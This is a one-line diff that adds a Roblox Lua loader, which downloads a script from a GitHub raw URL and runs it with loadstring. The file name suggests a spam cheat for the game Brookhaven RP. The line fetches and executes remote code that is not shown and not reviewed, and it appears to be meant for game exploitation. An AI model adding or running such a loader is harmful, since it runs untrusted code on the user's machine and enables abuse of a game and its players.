@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/brookhaven-rp-spam2-3okm3qndo8kewr.lua"))()
